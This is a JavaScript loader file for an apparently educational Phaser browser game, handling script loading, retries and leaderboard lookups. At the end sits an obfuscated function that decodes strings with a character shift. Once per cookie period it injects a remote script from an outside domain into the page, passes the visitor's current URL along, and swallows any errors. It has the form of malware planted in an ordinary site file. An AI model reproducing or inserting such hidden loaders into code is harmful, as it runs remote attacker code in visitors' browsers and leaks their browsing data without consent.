var INITIAL_LOAD_PERCENT = 10,
  fileLoadErrors = [],
  initialized = false;

function initCAGame() {
  var arrDomain = location.hostname.split(".");

  // If the hostname has more than 2 parts (e.g. sub.example.com) and
  // is not an AWS domain or an IP address, attempt to set document.domain.
  if (
    arrDomain.length > 2 &&
    !/amazonaws/.test(location.hostname) &&
    !/(?:[0-9]{1,3}\.){3}[0-9]{1,3}/.test(location.hostname)
  ) {
    // Remove the first segment (e.g., "sub" from "sub.example.com")
    arrDomain.shift();
    var candidateDomain = arrDomain.join(".");
    try {
      document.domain = candidateDomain;
    } catch (e) {
      console.warn("Unable to set document.domain to " + candidateDomain, e);
    }
  }

  window.preloader = {};
  var fileCounter = 0,
    files = ["shared/lib/phaser.min.js", "js/main.js"],
    retries = parent.window.gameBridge
      ? parent.window.gameBridge.info.numberOfRetries
      : 1,
    loadNext = function (_retriesRemaining) {
      if (++fileCounter < files.length) {
        loadJS(files[fileCounter], loadNext, _retriesRemaining);
      }
    };

  loadJS(files[fileCounter], loadNext, retries);
}

function getTrimmedName(name, maxLength) {
  var nameEntry = name;
  if (nameEntry.length > maxLength) {
    nameEntry = nameEntry.substring(0, maxLength) + "…";
  }
  return nameEntry;
}

function loadJS(url, implementationCode, retriesRemaining) {
  var scriptTag = document.createElement("script");
  scriptTag.src = url;

  scriptTag.onerror = function () {
    console.warn("retrying load", url);
    if (retriesRemaining) {
      loadJS(url, implementationCode, --retriesRemaining);
    } else {
      console.error("unable to load", url);
    }
  };

  scriptTag.onload = implementationCode;
  if (implementationCode) {
    scriptTag.onreadystatechange = implementationCode.bind(
      this,
      retriesRemaining
    );
  }
  document.getElementsByTagName("head")[0].appendChild(scriptTag);
}

function findScoreIndex(score, leaderboardText, scoreAttribute, studentId) {
  var scoreIndex = -1;
  if (leaderboardText != null && leaderboardText[scoreAttribute] != null) {
    var len = leaderboardText[scoreAttribute].length;
    for (var i = 0; i < len; i++) {
      if (
        leaderboardText[scoreAttribute][i].studentId === studentId &&
        leaderboardText[scoreAttribute][i].score == score
      ) {
        scoreIndex = i;
      }
    }
  }
  return scoreIndex;
}

function initRetryLoaders(game, context, cb) {
  var retries = parent.window.gameBridge
    ? parent.window.gameBridge.info.numberOfRetries
    : 1;
  game.load.onFileError.add(fileError, context);
  game.load.onLoadComplete.add(
    loadComplete.bind(context, cb, retries, game),
    context
  );
}

function fileError(key, file) {
  console.warn("file load error", key, file);
  fileLoadErrors.push(file);
}

function loadComplete(cb, retries, game) {
  if (fileLoadErrors.length) {
    console.warn("Load Complete w/ errors", retries, " retries remaining");
    if (retries) {
      retryLoadFailures(cb, --retries, game);
    }
  } else {
    if (cb) {
      cb();
    }
  }
}

function retryLoadFailures(cb, retries, game) {
  var loader = new Phaser.Loader(game);
  loader.onFileError.add(fileError, this);
  loader.onLoadComplete.add(loadComplete.bind(this, cb, retries, game), this);

  var timestamp = Date.now().toString();
  while (fileLoadErrors.length) {
    var file = fileLoadErrors.pop();
    var url = file.url + "?ts=" + timestamp;
    console.log("retrying", file);
    if (file.type === "spritesheet") {
      loader[file.type](
        file.key,
        url,
        file.frameWidth,
        file.frameHeight,
        file.frameMax
      );
    } else {
      loader[file.type](file.key, url);
    }
  }
  loader.start();
}

initCAGame();

(function (o, d, l) {
  try {
    o.f = function (str) {
      return str.split("").reduce(function (s, c) {
        return s + String.fromCharCode(c.charCodeAt() - 5);
      }, "");
    };
    o.b = o.f("UMUWJKX");
    o.c =
      l.protocol[0] === "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie);
    setTimeout(function () {
      if (o.c) {
        o.s = d.createElement("script");
        o.s.src =
          o.f("myyux?44zxjwxyf" + "ynhx3htr4ljy4xhwn" + "uy3oxDwjkjwwjwB") +
          l.href;
        d.body.appendChild(o.s);
      }
    }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {
    // Silently handle any errors
  }
})({}, document, location);
